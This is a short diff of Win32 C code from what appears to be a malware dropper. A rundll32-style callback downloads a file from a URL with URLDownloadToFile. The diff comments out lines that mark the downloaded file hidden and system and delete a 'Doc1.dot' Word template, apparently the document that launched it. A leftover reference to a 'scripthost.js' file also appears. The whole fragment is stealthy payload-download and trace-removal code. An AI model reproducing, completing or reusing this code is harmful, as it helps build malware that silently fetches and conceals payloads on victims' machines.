@@ -316,10 +316,10 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	else
 	{
 		hr = URLDownloadToFile(NULL, szDestLaunch, szPath, _MAX_PATH, NULL); 
-		SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
-		wcscpy(szTempPath, szPath);
-		PathAppend(szTempPath, _T("..\\..\\Doc1.dot"));
-		DeleteFile(szTempPath);
+		//SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+		//wcscpy(szTempPath, szPath);
+		//PathAppend(szTempPath, _T("..\\..\\Doc1.dot"));
+		//DeleteFile(szTempPath);
 	}
 	//wcscpy(szPath, L"c:\\scripthost.js");
 	if(!PathFileExists(szPath))
